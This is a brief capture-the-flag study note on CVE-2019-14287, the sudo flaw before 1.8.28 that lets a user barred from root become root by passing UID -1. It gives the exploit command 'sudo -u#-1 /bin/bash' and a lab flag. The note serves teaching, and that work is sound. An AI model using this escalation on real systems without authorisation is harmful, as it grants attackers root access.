# Sudo Security Bypass


- `CVE-2019-14287` is a vulnerability found in sudo and is present in versions < 1.8.28
- sudo allows you to execute programs as other users through username or user id (UID)
    - `sudo -u#<id> <command>` or `sudo -u <user> <command>`
- sudo can be configured manually through the `/etc/sudoers` file or through the `visudo`
- The vulnerability occurs when this is added to the sudoers file `<user> ALL=(ALL:!root) NOPASSWD: ALL`, or a variant of this that specifies programs that can be used, like `<user> ALL=(ALL, !root) NOPASSWD: /bin/bash`
    - This lets the specified user run any program - or the one specified - as any other user except as root
- Given that the sudoers file was configured as above for the current user, the vulnerable versions of sudo allowed the user to execute programs as root if they used a certain UID
    - If a UID value of -1 or its unsigned equivalent 4294967295 is specified, sudo would incorrectly read it as being 0 (root)
    - `sudo -u#-1 <command>`
- Exercise
    1. Use `sudo -l` to see `(ALL, !root) NOPASSWD: /bin/bash`, so we can run bash as any other user except for root. Exploit this with `sudo -u#-1 /bin/bash`
    2. `cat /root/root.txt` to find `THM{l33t_s3cur1ty_bypass}`
